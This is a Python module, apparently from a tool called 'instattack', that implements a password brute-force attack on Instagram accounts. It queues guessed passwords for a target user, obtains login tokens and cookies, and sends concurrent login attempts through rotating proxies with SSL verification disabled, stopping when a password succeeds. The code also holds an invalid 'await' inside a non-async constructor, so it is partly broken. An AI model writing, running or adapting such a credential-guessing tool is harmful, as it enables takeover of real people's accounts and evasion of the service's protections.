from __future__ import absolute_import

import asyncio
import aiohttp
import aiojobs

from instattack.app.exceptions import NoPasswordsError
from instattack.app.mixins import LoggerMixin
from instattack.lib.utils import percentage, limit_as_completed

from .models import InstagramResults
from .utils import get_token
from .login import attempt


"""
In Regard to Cancelled Tasks on Web Server Disconnect:
---------
<https://github.com/aio-libs/aiohttp/issues/2098>

Now web-handler task is cancelled on client disconnection (normal socket closing
by peer or just connection dropping by unpluging a wire etc.)

This is pretty normal behavior but it confuses people who come from world of
synchronous WSGI web frameworks like flask or django.

>>> async def handler(request):
>>>     async with request.app['db'] as conn:
>>>          await conn.execute('UPDATE ...')

The above is problematic if there is a client disconnect.

To remedy:

(1)  For client disconnections/fighting against Task cancellation I would
     recommend asyncio.shield. That's why it exists
(2)  In case user wants a way to control tasks in a more granular way, then I
     would recommend aiojobs
(3)  Ofc if user wants to execute background tasks (inside the same loop) I
      would also recommend aiojobs
"""


class LoginHandler(LoggerMixin):

    __name__ = 'Login Handler'
    __logconfig__ = "login_attempts"  # TODO: Won't need anymore with methods moved out.

    def __init__(self, config, proxy_handler, user=None, start_event=None):

        self.user = user
        self.start_event = start_event
        self.config = config
        self.proxy_handler = proxy_handler

        self._cookies = None
        self._token = None

        self.passwords = asyncio.Queue()

        self.num_completed = 0
        self.num_passwords = 0  # Index for the current password and attempts per password.

        self.scheduler = await aiojobs.create_scheduler(limit=100, exception_handler=None)

    async def attempt_single_login(self, loop, password):
        async with self.async_logger('attack', ignore_config=True) as log:
            await log.start('Starting Single Login')

            await self.passwords.put(password)
            self.num_passwords = 1

            results = await self.attack(loop)
            return results.results[0]

    async def attack(self, loop):
        async with self.async_logger('attack', ignore_config=True) as log:
            log = self.create_logger('attack', ignore_config=True)

            await self.prepopulate(loop)

            await log.start('Starting Attack')
            results = await self.attempt_login(loop)
            return results

    async def prepopulate(self, loop):
        async with self.async_logger('prepopulate', ignore_config=True) as log:

            limit = self.config['login']['limit']
            message = f'Generating All Attempts for User {self.user.username}.'
            if limit:
                message = (
                    f'Generating {limit} '
                    f'Attempts for User {self.user.username}.'
                )
            await log.start(message)

            passwords = await self.user.get_new_attempts(loop, limit=limit)
            if len(passwords) == 0:
                raise NoPasswordsError()

            self.num_passwords = len(passwords)
            for password in passwords:
                await self.passwords.put(password)

            await log.success(f"Prepopulated {self.passwords.qsize()} Password Attempts")

    @property
    def connector(self):
        return aiohttp.TCPConnector(
            ssl=False,
            force_close=True,
            limit=self.config['login']['connection']['limit'],
            limit_per_host=self.config['login']['connection']['limit_per_host'],
            enable_cleanup_closed=True,
        )

    @property
    def timeout(self):
        return aiohttp.ClientTimeout(
            total=self.config['login']['connection']['timeout']
        )

    @property
    def token(self):
        if not self._token:
            raise RuntimeError('Token Not Found Yet')
        return self._token

    async def cookies(self):
        if not self._cookies:
            # TODO: Set timeout to the token timeout.
            sess = aiohttp.ClientSession(connector=self.connector)
            self._token, self._cookies = await get_token(sess)

            if not self._token:
                raise RuntimeError('Could not find token.')

            await sess.close()

        return self._cookies

    async def login_task_generator(self, loop, session):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        log = self.create_logger('attempt_login', sync=True)

        while not self.passwords.empty():
            password = await self.passwords.get()
            if password:
                yield attempt(
                    loop,
                    session,
                    self.user,
                    self.token,
                    password,
                    proxy_pool=self.proxy_handler.pool,
                    scheduler=self.scheduler,
                    batch_size=self.config['login']['attempts']['batch_size'],
                )

        log.warning('Passwords Queue is Empty')

    async def attempt_login(self, loop):
        """
        For each password in the queue, runs the login_with_password coroutine
        concurrently in order to validate each password.

        The login_with_password coroutine will make several concurrent requests
        using different proxies, so this is the top level of a tree of nested
        concurrent IO operations.
        """

        # TODO: Need to make sure __logconfig__ is working properly for this
        # specific situation and situations in the .login.py file.
        async with self.async_logger('attempt_login') as log:
            results = InstagramResults(results=[])

            await log.debug('Waiting on Start Event...')
            await self.start_event.wait()
            cookies = await self.cookies()

            async with aiohttp.ClientSession(
                connector=self.connector,
                cookies=cookies,
                timeout=self.timeout,
            ) as session:
                gen = self.login_task_generator(loop, session)
                async for result, num_tries in limit_as_completed(
                    gen, self.config['login']['batch_size']
                ):
                    # Generator Does Not Yield None on No More Coroutines
                    if result.conclusive:
                        self.num_completed += 1

                        await log.success(
                            f'Percent Done: {percentage(self.num_completed, self.num_passwords)}')

                        if result.authorized:
                            await self.scheduler.spawn(
                                self.user.create_or_update_attempt(result.password, success=True))
                            results.add(result)
                            break

                        else:
                            if not result.not_authorized:
                                raise RuntimeError('Result should not be authorized.')

                            results.add(result)
                            await self.scheduler.spawn(
                                self.user.create_or_update_attempt(result.password, success=False))

            await log.complete('Closing Session')
            await asyncio.sleep(0)

            await self.scheduler.close()
            return results
